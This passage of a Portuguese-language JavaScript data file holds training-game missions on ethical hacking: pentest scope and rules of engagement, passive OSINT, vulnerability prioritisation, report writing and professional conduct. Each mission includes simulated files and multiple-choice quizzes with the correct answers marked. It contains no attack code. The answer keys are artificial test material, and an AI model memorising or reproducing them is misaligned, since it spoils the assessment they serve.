          { id: "b", texto: "Relatorio com estatisticas, exemplos anonimizados, riscos e plano de treinamento" },
          { id: "c", texto: "Senhas coletadas em anexo" },
          { id: "d", texto: "Apenas um ranking de culpados" }
        ],
        correta: "b",
        pontos: 70,
        feedback_correto: "Correto. O foco e melhorar processo e cultura, com privacidade e acoes corretivas.",
        feedback_errado: "Teste de conscientizacao deve gerar aprendizado, nao exposicao publica ou coleta de segredos."
      }
    ],
    conclusao: {
      o_que_aconteceu: "Voce conduziu um teste simulado de engenharia social com IA representando uma funcionaria.",
      vulnerabilidade: "Pressa, autoridade falsa e canais informais podem levar pessoas a revelar dados ou clicar em links.",
      risco: "Roubo de credenciais, fraude financeira, bypass de MFA e comprometimento inicial da empresa.",
      como_corrigir: "1. Definir escopo\n2. Usar dados simulados\n3. Treinar validacao de identidade\n4. Criar canal simples de reporte\n5. Medir melhoria sem expor pessoas\n6. Reforcar politicas de MFA e senhas",
      boa_pratica: "Engenharia social etica deve proteger pessoas enquanto mede riscos reais de processo e cultura."
    }
  },

  // ─── MISSÕES 19-23: TRILHA HACKER ÉTICO ─────────────────────────────────
  {
    id: 19,
    titulo: "Contrato e Escopo de Pentest",
    subtitulo: "Autorizacao, regras de engajamento e limites legais",
    dificuldade: "Fácil",
    tipo: "terminal",
    pontos_maximos: 150,
    icone: "📄",
    contexto: `Antes de qualquer teste tecnico, um hacker etico precisa de autorizacao formal.
Sua missao: <strong>revisar o escopo de um pentest e identificar o que pode ou nao pode ser testado</strong>.`,
    dica: "Leia <code>cat /engagement/rules-of-engagement.txt</code>.",
    filesystem: { "/": ["engagement"], "/engagement": ["rules-of-engagement.txt", "assets.txt"] },
    files: {
      "/engagement/rules-of-engagement.txt": `Escopo permitido:
- app.alvo.local
- API homologacao 10.20.30.15
- Testes entre 22h e 02h
- Sem engenharia social
- Sem DoS, sem exfiltracao real, sem persistencia
- Contato de emergencia: soc@alvo.local`,
      "/engagement/assets.txt": `Fora de escopo:
- sistemas de terceiros
- ambiente de producao financeira
- contas pessoais de funcionarios`
    },
    perguntas: [
      {
        id: 1,
        texto: "Qual item deve existir antes de iniciar um pentest?",
        opcoes: [
          { id: "a", texto: "Autorizacao formal, escopo, janela de teste e contato de emergencia" },
          { id: "b", texto: "Apenas uma mensagem informal no chat" },
          { id: "c", texto: "Promessa verbal de um amigo" },
          { id: "d", texto: "Nenhum documento, para manter realismo" }
        ],
        correta: "a",
        pontos: 50,
        feedback_correto: "Correto. Autorizacao e regras de engajamento protegem cliente, analista e usuarios.",
        feedback_errado: "Sem autorizacao formal, atividade tecnica pode ser interpretada como invasao."
      },
      {
        id: 2,
        texto: "Se engenharia social esta fora do escopo, o que fazer?",
        opcoes: [
          { id: "a", texto: "Testar mesmo assim se parecer importante" },
          { id: "b", texto: "Solicitar mudanca formal de escopo antes de qualquer teste desse tipo" },
          { id: "c", texto: "Usar conta pessoal para nao aparecer nos logs" },
          { id: "d", texto: "Pedir senha a funcionarios sem registrar" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Exato. Mudancas de escopo precisam ser aprovadas e documentadas.",
        feedback_errado: "O escopo e limite legal. Nao execute testes proibidos sem aprovacao formal."
      },
      {
        id: 3,
        texto: "Por que contato de emergencia e importante?",
        opcoes: [
          { id: "a", texto: "Para vender outro servico" },
          { id: "b", texto: "Para interromper ou ajustar testes caso haja impacto inesperado" },
          { id: "c", texto: "Para esconder alertas do SOC" },
          { id: "d", texto: "Nao tem utilidade em pentest" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Correto. Mesmo testes autorizados podem causar alerta ou impacto e precisam de canal rapido.",
        feedback_errado: "Contato de emergencia reduz dano operacional e evita confusao durante o teste."
      }
    ],
    conclusao: {
      o_que_aconteceu: "Voce validou regras de engajamento antes da parte tecnica.",
      vulnerabilidade: "Pentest sem escopo cria risco legal e operacional.",
      risco: "Indisponibilidade, acesso a terceiros, coleta indevida e responsabilizacao do analista.",
      como_corrigir: "1. Contrato\n2. Escopo\n3. Janela\n4. Limites\n5. Contato de emergencia\n6. Evidencias e comunicacao",
      boa_pratica: "Hacker etico comeca pelo papel assinado, nao pelo terminal."
    }
  },
  {
    id: 20,
    titulo: "Reconhecimento Etico",
    subtitulo: "OSINT e mapeamento sem tocar no alvo",
    dificuldade: "Médio",
    tipo: "terminal",
    pontos_maximos: 180,
    icone: "🔎",
    contexto: `Voce esta em um pentest autorizado e deve iniciar por reconhecimento passivo.
Sua missao: <strong>classificar fontes OSINT, riscos de exposicao e proximos passos seguros</strong>.`,
    dica: "Leia <code>cat /recon/osint-report.txt</code>.",
    filesystem: { "/": ["recon"], "/recon": ["osint-report.txt", "scope.txt"] },
    files: {
      "/recon/osint-report.txt": `Achados:
- repositorio publico com e-mail de devops
- subdominio staging.alvo.local indexado
- tecnologias expostas em vagas de emprego
- bucket publico com imagens sem dados sensiveis`,
      "/recon/scope.txt": `Permitido: OSINT passivo e validacao em ambiente homologacao.
Proibido: varredura agressiva fora da janela.`
    },
    perguntas: [
      { id: 1, texto: "Qual atividade e reconhecimento passivo?", opcoes: [{ id: "a", texto: "Consultar DNS publico, vagas e repositorios publicos" }, { id: "b", texto: "Explorar vulnerabilidade no servidor" }, { id: "c", texto: "Forcar senha de login" }, { id: "d", texto: "Derrubar firewall para medir resposta" }], correta: "a", pontos: 60, feedback_correto: "Correto. OSINT passivo usa fontes publicas sem interagir agressivamente com o alvo.", feedback_errado: "Reconhecimento passivo evita exploracao, brute force ou trafego agressivo." },
      { id: 2, texto: "Como tratar um segredo encontrado em repositorio publico?", opcoes: [{ id: "a", texto: "Usar o segredo para provar acesso" }, { id: "b", texto: "Registrar evidencia minima, notificar o cliente e recomendar rotacao imediata" }, { id: "c", texto: "Publicar para alertar a comunidade" }, { id: "d", texto: "Ignorar porque estava publico" }], correta: "b", pontos: 60, feedback_correto: "Exato. Evidencie sem ampliar dano e recomende revogacao/rotacao.", feedback_errado: "Segredos encontrados devem ser protegidos e reportados, nao usados ou divulgados." },
      { id: 3, texto: "Por que mapear tecnologias antes de testar?", opcoes: [{ id: "a", texto: "Para escolher testes proporcionais e reduzir ruido" }, { id: "b", texto: "Para evitar escrever relatorio" }, { id: "c", texto: "Para atacar terceiros" }, { id: "d", texto: "Nao ha beneficio" }], correta: "a", pontos: 60, feedback_correto: "Correto. Bom reconhecimento torna o teste mais preciso e seguro.", feedback_errado: "Tecnologia, versoes e exposicoes ajudam a priorizar testes relevantes." }
    ],
    conclusao: {
      o_que_aconteceu: "Voce classificou achados OSINT e preparou uma abordagem proporcional.",
      vulnerabilidade: "Informacoes publicas podem revelar superficie de ataque e segredos.",
      risco: "Ataques mais direcionados, phishing e exploracao de ambientes esquecidos.",
      como_corrigir: "1. Monitorar exposicoes\n2. Remover segredos\n3. Reduzir indexacao\n4. Revisar buckets\n5. Treinar equipes",
      boa_pratica: "OSINT etico coleta o minimo necessario e transforma achados em reducao de risco."
    }
  },
  {
    id: 21,
    titulo: "Gestao de Vulnerabilidades",
    subtitulo: "Priorizando CVEs por risco real",
    dificuldade: "Médio",
    tipo: "terminal",
    pontos_maximos: 180,
    icone: "🩹",
    contexto: `A empresa recebeu 200 achados de scanner e nao sabe por onde comecar.
Sua missao: <strong>priorizar vulnerabilidades por explorabilidade, exposicao e impacto</strong>.`,
    dica: "Leia <code>cat /vuln/triage.csv</code> e <code>cat /vuln/sla.md</code>.",
    filesystem: { "/": ["vuln"], "/vuln": ["triage.csv", "sla.md"] },
    files: {
      "/vuln/triage.csv": `id,ativo,exposicao,severidade,exploit,impacto
1,vpn01,internet,critica,publico,acesso remoto
2,printer03,lan,media,nao,info leak
3,web-old,dmz,alta,publico,rce
4,devbox,isolado,alta,nao,local`,
      "/vuln/sla.md": `Critica exposta: 24-72h
Alta exposta: 7 dias
Media interna: 30 dias
Aceite de risco: documentado e aprovado`
    },
    perguntas: [
      { id: 1, texto: "Qual achado deve ser tratado primeiro?", opcoes: [{ id: "a", texto: "VPN critica exposta a internet com exploit publico" }, { id: "b", texto: "Impressora interna com info leak media" }, { id: "c", texto: "Falha local em maquina isolada" }, { id: "d", texto: "Qualquer baixa porque e facil" }], correta: "a", pontos: 60, feedback_correto: "Correto. Exposicao externa, criticidade e exploit publico elevam prioridade.", feedback_errado: "Priorize risco real: exposicao, exploitabilidade e impacto." },
      { id: 2, texto: "CVSS sozinho e suficiente?", opcoes: [{ id: "a", texto: "Sim, sempre" }, { id: "b", texto: "Nao. Deve ser combinado com contexto do ativo, exposicao e ameacas" }, { id: "c", texto: "Nao se usa CVSS" }, { id: "d", texto: "Apenas para servidores Linux" }], correta: "b", pontos: 60, feedback_correto: "Exato. CVSS ajuda, mas contexto define prioridade operacional.", feedback_errado: "Sem contexto, um score alto isolado pode receber prioridade errada." },
      { id: 3, texto: "Quando um risco nao pode ser corrigido no prazo, o que fazer?", opcoes: [{ id: "a", texto: "Ignorar ate sumir do scanner" }, { id: "b", texto: "Documentar aceite, mitigacoes compensatorias e responsavel" }, { id: "c", texto: "Excluir o ativo do relatorio" }, { id: "d", texto: "Desligar logs" }], correta: "b", pontos: 60, feedback_correto: "Correto. Aceite de risco precisa ser consciente, temporario e rastreavel.", feedback_errado: "Risco nao corrigido deve ter dono, mitigacao e prazo, nao desaparecer do processo." }
    ],
    conclusao: {
      o_que_aconteceu: "Voce transformou uma lista bruta de achados em plano de remediacao por risco.",
      vulnerabilidade: "Scanner sem triagem gera ruido e atrasa correcoes criticas.",
      risco: "Equipes gastam tempo no que e facil enquanto ativos expostos seguem vulneraveis.",
      como_corrigir: "1. Inventario\n2. Classificacao\n3. Contexto\n4. SLA\n5. Remediacao\n6. Validacao",
      boa_pratica: "Gestao de vulnerabilidades e ciclo continuo, nao apenas executar scanner."
    }
  },
  {
    id: 22,
    titulo: "Relatorio de Pentest",
    subtitulo: "Comunicando risco para tecnico e executivo",
    dificuldade: "Médio",
    tipo: "terminal",
    pontos_maximos: 180,
    icone: "📊",
    contexto: `Depois do teste, o valor do trabalho depende da clareza do relatorio.
Sua missao: <strong>montar evidencias, impacto, recomendacoes e resumo executivo</strong>.`,
    dica: "Leia <code>cat /report/findings.md</code> e <code>cat /report/template.md</code>.",
    filesystem: { "/": ["report"], "/report": ["findings.md", "template.md"] },
    files: {
      "/report/findings.md": `Achado: IDOR em /api/invoices/{id}
Evidencia: usuario A acessa fatura de usuario B alterando id numerico.
Impacto: exposicao de dados financeiros.
Reproducao: descrita em ambiente homologacao.
Correcao: controle de autorizacao por objeto e testes automatizados.`,
      "/report/template.md": `1. Resumo executivo
2. Escopo e metodologia
3. Achados por severidade
4. Evidencias seguras
5. Impacto de negocio
6. Recomendacoes
7. Plano de reteste`
    },
    perguntas: [
      { id: 1, texto: "O que diferencia um bom achado tecnico?", opcoes: [{ id: "a", texto: "Titulo assustador sem evidencia" }, { id: "b", texto: "Evidencia, impacto, passos reproduziveis e recomendacao" }, { id: "c", texto: "Prints sem contexto" }, { id: "d", texto: "Exploit publico anexado sem necessidade" }], correta: "b", pontos: 60, feedback_correto: "Correto. Achado bom permite entender, reproduzir e corrigir.", feedback_errado: "Relatorio precisa conectar prova tecnica a risco e acao de correcao." },
      { id: 2, texto: "Como tratar dados sensiveis no relatorio?", opcoes: [{ id: "a", texto: "Mostrar tudo para provar impacto" }, { id: "b", texto: "Redigir ou mascarar, mantendo evidencia suficiente" }, { id: "c", texto: "Enviar por chat publico" }, { id: "d", texto: "Guardar em computador pessoal" }], correta: "b", pontos: 60, feedback_correto: "Exato. Evidencia deve provar sem ampliar vazamento.", feedback_errado: "Dados sensiveis devem ser minimizados, mascarados e armazenados com seguranca." },
      { id: 3, texto: "Por que incluir resumo executivo?", opcoes: [{ id: "a", texto: "Para substituir detalhes tecnicos" }, { id: "b", texto: "Para traduzir risco tecnico em impacto e prioridade de negocio" }, { id: "c", texto: "Para esconder problemas" }, { id: "d", texto: "Nao e necessario" }], correta: "b", pontos: 60, feedback_correto: "Correto. Decisores precisam entender risco, prioridade e investimento necessario.", feedback_errado: "Resumo executivo nao remove detalhe tecnico; ele ajuda decisao e priorizacao." }
    ],
    conclusao: {
      o_que_aconteceu: "Voce estruturou um relatorio que ajuda tecnicos a corrigir e gestores a priorizar.",
      vulnerabilidade: "Achados mal comunicados atrasam remediacao mesmo quando a falha e real.",
      risco: "Risco permanece aberto por falta de clareza, dono ou prioridade.",
      como_corrigir: "1. Evidencia segura\n2. Impacto\n3. Severidade\n4. Recomendacao\n5. Responsavel\n6. Reteste",
      boa_pratica: "O trabalho do hacker etico termina quando o risco foi entendido e pode ser corrigido."
    }
  },
  {
    id: 23,
    titulo: "Codigo de Conduta do Hacker Etico",
    subtitulo: "Profissao, aprendizado continuo e responsabilidade",
    dificuldade: "Fácil",
    tipo: "multipla_escolha",
    pontos_maximos: 150,
    icone: "🎓",
    contexto: `Ser hacker etico nao e dominar ferramentas isoladas. E combinar conhecimento tecnico, autorizacao,
comunicacao, privacidade, documentacao e aprendizado continuo. Esta missao fecha a trilha com os principios essenciais.`,
    dica: "Responda pensando em postura profissional, nao apenas em comandos.",
    perguntas: [
      { id: 1, texto: "Qual principio resume a diferenca entre hacker etico e atacante?", opcoes: [{ id: "a", texto: "Autorizacao explicita, escopo e objetivo de reduzir risco" }, { id: "b", texto: "Usar ferramentas mais novas" }, { id: "c", texto: "Nunca escrever relatorio" }, { id: "d", texto: "Ocultar identidade do cliente" }], correta: "a", pontos: 50, feedback_correto: "Correto. Autorizacao e reducao de risco sao a base.", feedback_errado: "Ferramentas nao definem etica. Autorizacao, escopo e finalidade defensiva definem." },
      { id: 2, texto: "Qual rotina ajuda evolucao profissional segura?", opcoes: [{ id: "a", texto: "Praticar em labs, CTFs, ambientes proprios e programas autorizados" }, { id: "b", texto: "Testar sites aleatorios para aprender" }, { id: "c", texto: "Comprar credenciais vazadas" }, { id: "d", texto: "Ignorar fundamentos e decorar comandos" }], correta: "a", pontos: 50, feedback_correto: "Exato. Aprendizado deve acontecer em ambientes permitidos e controlados.", feedback_errado: "Pratica sem autorizacao pode ser crime. Use labs, CTFs e programas com regras claras." },
      { id: 3, texto: "Ao encontrar uma falha fora do escopo, qual atitude correta?", opcoes: [{ id: "a", texto: "Explorar ate o fim para provar habilidade" }, { id: "b", texto: "Parar, registrar o minimo necessario e pedir orientacao formal" }, { id: "c", texto: "Publicar imediatamente" }, { id: "d", texto: "Vender a informacao" }], correta: "b", pontos: 50, feedback_correto: "Correto. Fora de escopo exige pausa e comunicacao formal.", feedback_errado: "Explorar fora do escopo rompe autorizacao. Pare e comunique pelo canal combinado." }
    ],
    conclusao: {
      o_que_aconteceu: "Voce revisou os fundamentos profissionais de hacking etico.",
      vulnerabilidade: "Habilidade tecnica sem etica, processo e comunicacao vira risco.",
      risco: "Danos a terceiros, violacao legal, perda de confianca e falhas sem correcao.",
      como_corrigir: "1. Autorizacao\n2. Escopo\n3. Minimo necessario\n4. Privacidade\n5. Relatorio claro\n6. Reteste\n7. Aprendizado continuo",
      boa_pratica: "O melhor hacker etico deixa sistemas, pessoas e processos mais seguros do que encontrou."
    }
  }
];

module.exports = missionsData;
